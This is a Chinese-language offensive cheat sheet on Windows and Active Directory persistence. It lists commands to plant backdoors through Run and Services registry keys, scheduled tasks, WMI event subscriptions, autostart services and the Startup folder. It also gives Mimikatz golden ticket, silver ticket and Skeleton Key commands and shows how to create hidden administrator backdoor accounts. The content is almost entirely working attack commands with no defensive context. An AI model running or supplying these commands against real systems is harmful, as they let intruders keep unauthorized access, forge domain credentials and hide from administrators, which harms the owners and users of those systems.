# 权限维持

## 1. 注册表持久化

### Run键

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\shell.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\shell.exe"
```

### Services键

```cmd
reg add "HKLM\System\CurrentControlSet\Services\ServiceName" /v ImagePath /t REG_SZ /d "C:\shell.exe"
```

---

## 2. 计划任务

```cmd
schtasks /create /tn "Backdoor" /tr "C:\shell.exe" /sc daily /st 09:00
schtasks /create /tn "Backdoor" /tr "C:\shell.exe" /sc onlogon
```

### PowerShell

```powershell
Register-ScheduledTask -TaskName "Backdoor" -Action (New-ScheduledTaskAction -Execute "C:\shell.exe") -Trigger (New-ScheduledTaskTrigger -AtLogOn)
```

---

## 3. WMI事件订阅

```powershell
$filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name='Backdoor';EventNameSpace='root\CIMV2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"}
$consumer=Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name='Backdoor';CommandLineTemplate="C:\shell.exe";}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}
```

---

## 4. 黄金票据

### Mimikatz

```bash
kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:hash /user:admin /ticket:golden.kirbi
kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:hash /user:admin /ptt
```

---

## 5. 白银票据

```bash
kerberos::silver /domain:target.com /sid:S-1-5-21-xxx /target:target.com /service:cifs /rc4:hash /user:admin
```

---

## 6. Skeleton Key

```bash
privilege::debug
misc::skeleton
```

---

## 7. 创建后门用户

```cmd
net user backdoor password /add
net localgroup Administrators backdoor /add
```

### 隐藏用户

```cmd
net user backdoor$ password /add
```

---

## 8. 服务持久化

```cmd
sc create "ServiceName" binPath= "C:\shell.exe" start= auto
sc start ServiceName
```

---

## 9. 启动文件夹

```cmd
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## 10. COM劫持

注册CLSID实现持久化
